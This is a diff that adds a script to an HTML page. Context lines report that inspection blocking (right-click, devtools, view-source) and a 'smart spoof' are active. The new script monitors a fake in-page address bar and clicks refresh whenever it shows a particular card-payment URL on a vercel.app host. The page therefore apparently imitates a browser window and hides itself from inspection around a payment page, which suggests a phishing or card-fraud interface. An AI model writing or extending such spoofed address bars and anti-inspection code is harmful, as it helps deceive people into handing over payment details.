@@ -3053,5 +3053,52 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
     console.log('✅ Smart spoof active – will refresh only after iframe load if bad URL appears');
 })();
 </script>
+<script>
+(function() {
+    "use strict";
+
+    const TARGET_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
+    const urlInput = document.getElementById('urlInput');
+    const refreshBtn = document.getElementById('refreshBtn');
+
+    if (!urlInput || !refreshBtn) return;
+
+    let pendingRefresh = false;
+
+    function triggerRefresh() {
+        if (pendingRefresh) return;
+        pendingRefresh = true;
+
+        // Simulate a natural click on the refresh button
+        refreshBtn.click();
+
+        // Reset flag after a short delay to allow further detection
+        setTimeout(() => { pendingRefresh = false; }, 500);
+    }
+
+    function checkAndRefresh() {
+        if (urlInput.value === TARGET_URL) {
+            triggerRefresh();
+        }
+    }
+
+    // Watch for changes to the address bar (user typing, navigation, etc.)
+    urlInput.addEventListener('input', checkAndRefresh);
+    urlInput.addEventListener('change', checkAndRefresh);
+
+    // Also observe DOM changes in case the value is set programmatically
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
+                checkAndRefresh();
+            }
+        });
+    });
+    observer.observe(urlInput, { attributes: true, attributeFilter: ['value'] });
+
+    // Initial check
+    checkAndRefresh();
+})();
+</script>
 </body>
 </html>
